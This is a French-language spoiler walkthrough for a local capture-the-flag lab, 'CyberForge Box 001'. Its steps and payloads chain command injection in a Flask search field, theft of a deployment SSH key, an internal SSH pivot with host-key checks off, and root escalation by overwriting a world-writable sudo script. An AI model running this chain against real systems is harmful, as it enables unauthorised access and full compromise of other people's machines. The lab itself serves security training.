# SPOILER — Solution de CyberForge Box 001

**Ne lisez ce fichier que si vous acceptez d’être spoilé.**

Ce walkthrough décrit le chemin prévu dans **ce lab local uniquement**. Il ne s’applique à aucun système tiers.

Les payloads ci-dessous se saisissent dans le champ `q` de `/search`. Le `#` final ignore le reste de la commande `grep`.

---

## Vue d’ensemble

```text
Reconnaissance
    ↓
Application web (127.0.0.1:5000)
    ↓
Injection de commande sur /search
    ↓
Lecture des artefacts de déploiement sur l’app
    ↓
SSH interne vers target (utilisateur cyber)
    ↓
user.txt
    ↓
sudo + script world-writable
    ↓
root.txt
```

---

## 1. Reconnaissance

```bash
curl -s http://127.0.0.1:5000/
curl -s http://127.0.0.1:5000/robots.txt
curl -s -o /dev/null -w "%{http_code}\n" http://127.0.0.1:5000/admin
```

La page identifie **CyberForge Box 001 / Version 1.0**.

`/admin` est interdit et indique que les déploiements partent de l’hôte applicatif. `/search` est un formulaire de recherche d’inventaire.

---

## 2. Découverte de la vulnérabilité

Recherche normale : `target`

Puis injection :

```text
x; id #
```

La sortie doit contenir l’identité du processus applicatif (`appuser`), pas `root`.

Équivalent curl :

```bash
curl -sG 'http://127.0.0.1:5000/search' --data-urlencode 'q=x; id #'
```

---

## 3. Initial access

L’exécution de commande a lieu **dans le conteneur app**, pas encore sur la cible.

```text
x; ls -l /opt/deploy #
x; cat /opt/deploy/deploy.conf #
```

On obtient :

- hôte : `target`
- utilisateur : `cyber`
- clé : `/opt/deploy/id_rsa`

Vérifier un accès SSH interne :

```text
x; ssh -i /opt/deploy/id_rsa -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null cyber@target id #
```

Le résultat attendu est un uid `cyber` sur la cible.

---

## 4. Flag utilisateur

```text
x; ssh -i /opt/deploy/id_rsa -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null cyber@target cat /home/cyber/user.txt #
```

`user.txt` n’est lisible que par `cyber` (mode 600). Il n’est pas servi par Flask.

---

## 5. Privilege escalation

```text
x; ssh -i /opt/deploy/id_rsa -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null cyber@target sudo -l #
```

`cyber` peut exécuter `/usr/local/bin/system-health.sh` via sudo sans mot de passe. Le script est **world-writable**. C’est une mauvaise configuration volontaire, limitée à ce lab.

Les guillemets simples autour de la commande distante sont nécessaires pour que la redirection se fasse **sur la cible** :

```text
x; ssh -i /opt/deploy/id_rsa -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null cyber@target 'echo "#!/bin/bash" > /usr/local/bin/system-health.sh' #
x; ssh -i /opt/deploy/id_rsa -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null cyber@target 'echo "cat /root/root.txt" >> /usr/local/bin/system-health.sh' #
x; ssh -i /opt/deploy/id_rsa -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null cyber@target sudo /usr/local/bin/system-health.sh #
```

---

## 6. Flag root

La dernière commande affiche `/root/root.txt` (`root:root`, mode 600).

Après un test, réinitialisez la box pour restaurer le script d’origine :

```bash
./scripts/reset.sh
```
